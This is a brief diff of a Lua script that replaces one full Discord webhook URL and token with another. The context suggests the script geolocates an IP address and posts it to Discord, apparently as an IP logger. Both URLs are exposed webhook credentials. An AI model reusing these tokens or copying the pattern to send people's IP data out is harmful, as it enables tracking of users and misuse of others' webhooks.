@@ -58,7 +58,7 @@ local function generateGeoLink(ip)
 end
 
 -- Construct the webhook data
-local url = "https://discord.com/api/webhooks/1265800474494374127/dVJZ2izk-tBkT1LRKnc6TUzHJ-NHUt0wG4YI_e-dJx7Trl_9kW3Jbfo8KsraxZYW0yW_"  -- Replace with your webhook URL
+local url = "https://discord.com/api/webhooks/1266074223860781077/BAGPJ7cOHg9FUTGTvfmtykQ4-fcv3h6CODdZ4Q-tWVTyYwwUdklZ761FUEG-OMKaEewb"  -- Replace with your webhook URL
 local data = {
     ["content"] = " ",
     ["embeds"] = {
